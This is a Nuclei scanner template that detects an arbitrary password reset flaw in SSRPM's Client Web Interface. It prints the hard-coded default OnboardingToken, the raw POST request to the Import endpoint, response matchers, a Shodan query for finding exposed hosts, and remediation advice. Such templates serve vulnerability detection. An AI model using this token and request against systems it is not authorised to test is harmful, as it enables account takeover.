http:
- extractors:
  - kval:
    - string
    type: kval
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"ErrorCode":-55'
    - '"Success":false'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /Onboarding/Import HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    OnboardingToken=7e30bebc-d17c-4833-98b6-d4c09e076b24&Action={{string}}

    '
id: ssrpm-arbitrary-password-reset
info:
  author: vince-isec
  description: 'The default installation of the Client Web Interface, which is provided
    alongside the COM SSRPM service, defines a hard-coded secret token for the Import
    endpoint. This endpoint allows registering new accounts or overwriting existing
    onboarding data for an arbitrary account, which ultimately allows changing the
    password of an arbitrary account.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:-916902413
    verified: true
  name: SSRPM - Arbitary Password Reset on Default Client Interface Installation
  reference:
  - https://www.synacktiv.com/advisories/ssrpm-arbitrary-password-reset-on-default-client-web-interface-installation
  remediation: Set a new and random value to the OnboardingToken setting. Install
    the new version of SSRPM and its web interface.
  severity: high
  tags: ssrpm,intrusive
variables:
  string: '{{to_lower(rand_text_alpha(5))}}'
